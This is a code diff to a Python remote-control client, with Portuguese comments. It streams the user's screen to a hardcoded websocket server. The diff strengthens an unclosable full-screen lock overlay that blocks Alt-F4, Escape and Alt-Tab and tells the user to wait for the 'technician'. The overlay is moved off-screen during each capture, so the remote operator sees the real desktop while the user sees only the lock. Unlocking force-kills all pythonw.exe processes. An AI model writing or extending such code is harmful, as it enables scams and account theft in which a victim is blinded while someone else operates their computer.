@@ -19,7 +19,7 @@ import pyautogui
 import pyperclip
 
 SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
-FRAME_INTERVAL = 0.033
+FRAME_INTERVAL = 0.04
 QUALITY = 70
 SCALE = 0.75
 
@@ -35,7 +35,17 @@ panel_connected = False
 ws_app = None
 running = True
 screen_locked = False
-lock_process = None
+lock_hwnd = None
+screen_width = 1920
+screen_height = 1080
+
+# Windows API
+user32 = ctypes.windll.user32
+SWP_NOSIZE = 0x0001
+SWP_NOZORDER = 0x0004
+SWP_NOACTIVATE = 0x0010
+SWP_SHOWWINDOW = 0x0040
+HWND_TOPMOST = -1
 
 
 def set_console_title(title):
@@ -128,93 +138,128 @@ def get_system_info():
 
 
 # ============================================
-# LOCK SCREEN - PROCESSO SEPARADO
+# LOCK SCREEN
 # ============================================
 
 LOCK_SCRIPT = '''
 import sys
 import ctypes
+
+user32 = ctypes.windll.user32
+sw = user32.GetSystemMetrics(0)
+sh = user32.GetSystemMetrics(1)
+
 import tkinter as tk
 
 message = sys.argv[1] if len(sys.argv) > 1 else "Aguarde..."
 
 root = tk.Tk()
 root.title("")
-sw = root.winfo_screenwidth()
-sh = root.winfo_screenheight()
 root.geometry(f"{sw}x{sh}+0+0")
-root.configure(bg='#000000')
+root.configure(bg='#0a0a0a')
 root.overrideredirect(True)
 root.attributes('-topmost', True)
 root.protocol("WM_DELETE_WINDOW", lambda: None)
-root.bind('<Alt-F4>', lambda e: 'break')
-root.bind('<Escape>', lambda e: 'break')
+
+for key in ['<Alt-F4>', '<Escape>', '<Alt-Tab>', '<Alt-Escape>', '<Control-Escape>']:
+    root.bind(key, lambda e: 'break')
 
 root.update_idletasks()
-try:
-    hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
-    if hwnd == 0:
-        hwnd = root.winfo_id()
-    ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x11)
-except:
-    pass
+hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
+if hwnd == 0:
+    hwnd = root.winfo_id()
 
-frame = tk.Frame(root, bg='#000000')
+# Salvar HWND em arquivo para o processo principal
+import tempfile
+import os
+hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
+with open(hwnd_file, 'w') as f:
+    f.write(str(hwnd))
+
+frame = tk.Frame(root, bg='#0a0a0a')
 frame.place(relx=0.5, rely=0.5, anchor='center')
-tk.Label(frame, text="\\U0001F512", font=('Segoe UI Emoji', 72), bg='#000000', fg='#f59e0b').pack(pady=20)
-tk.Label(frame, text=message, font=('Segoe UI', 24, 'bold'), bg='#000000', fg='#ffffff', wraplength=700).pack(pady=15)
-tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 12), bg='#000000', fg='#555555').pack(pady=10)
 
-def keep_top():
-    root.lift()
-    root.attributes('-topmost', True)
-    root.after(200, keep_top)
+tk.Label(frame, text="\\U0001F512", font=('Segoe UI Emoji', 80), bg='#0a0a0a', fg='#f59e0b').pack(pady=20)
+tk.Label(frame, text=message, font=('Segoe UI', 28, 'bold'), bg='#0a0a0a', fg='#ffffff', wraplength=800).pack(pady=15)
+tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.", font=('Segoe UI', 14), bg='#0a0a0a', fg='#666666').pack(pady=10)
 
-keep_top()
+def stay_top():
+    try:
+        root.lift()
+        root.focus_force()
+        root.attributes('-topmost', True)
+        root.after(100, stay_top)
+    except:
+        pass
+
+stay_top()
 root.mainloop()
 '''
 
 
 def show_lock_screen(message):
-    global screen_locked, lock_process
+    global screen_locked, lock_hwnd
 
     if screen_locked:
         return
 
     screen_locked = True
+    lock_hwnd = None
 
     try:
-        # Criar arquivo temporario com o script
         import tempfile
         script_path = os.path.join(tempfile.gettempdir(), 'lock_screen.pyw')
+        hwnd_file = os.path.join(tempfile.gettempdir(), 'lock_hwnd.txt')
+
+        # Remover arquivo antigo
+        try:
+            os.remove(hwnd_file)
+        except:
+            pass
+
         with open(script_path, 'w', encoding='utf-8') as f:
             f.write(LOCK_SCRIPT)
 
-        # Executar como processo separado (pythonw para sem console)
         pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
         if not os.path.exists(pythonw):
             pythonw = sys.executable
 
-        lock_process = subprocess.Popen(
+        subprocess.Popen(
             [pythonw, script_path, message],
             creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
         )
-    except Exception as e:
+
+        # Aguardar HWND ser salvo
+        for _ in range(20):
+            time.sleep(0.1)
+            if os.path.exists(hwnd_file):
+                with open(hwnd_file, 'r') as f:
+                    lock_hwnd = int(f.read().strip())
+                break
+
+    except:
         screen_locked = False
 
 
 def hide_lock_screen():
-    global screen_locked, lock_process
+    global screen_locked, lock_hwnd
 
     screen_locked = False
 
-    if lock_process:
+    if lock_hwnd:
         try:
-            lock_process.terminate()
-            lock_process.kill()
+            # Fechar janela
+            user32.PostMessageW(lock_hwnd, 0x0010, 0, 0)  # WM_CLOSE
         except:
             pass
-        lock_process = None
+        lock_hwnd = None
+
+    # Matar processos pythonw que rodam o lock
+    try:
+        subprocess.run(['taskkill', '/f', '/im', 'pythonw.exe'],
+                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
 
 
 # ============================================
@@ -222,9 +267,13 @@ def hide_lock_screen():
 # ============================================
 
 def capture_screen():
-    global panel_connected, running, current_quality, current_scale
+    global panel_connected, running, current_quality, current_scale, lock_hwnd, screen_width, screen_height
 
     sct = mss.mss()
+
+    # Pegar dimensoes da tela
+    screen_width = user32.GetSystemMetrics(0)
+    screen_height = user32.GetSystemMetrics(1)
 
     while running:
         if not panel_connected:
@@ -232,9 +281,22 @@ def capture_screen():
             continue
 
         try:
+            # Se lock ativo, mover janela para fora, capturar, mover de volta
+            hwnd = lock_hwnd if screen_locked else None
+
+            if hwnd:
+                # Mover para fora da tela (instantaneo)
+                user32.SetWindowPos(hwnd, 0, -9999, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)
+
+            # Capturar
             monitor = sct.monitors[1]
             screenshot = sct.grab(monitor)
 
+            if hwnd:
+                # Mover de volta (instantaneo)
+                user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW)
+
+            # Processar imagem
             img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
 
             new_w = int(img.width * current_scale)
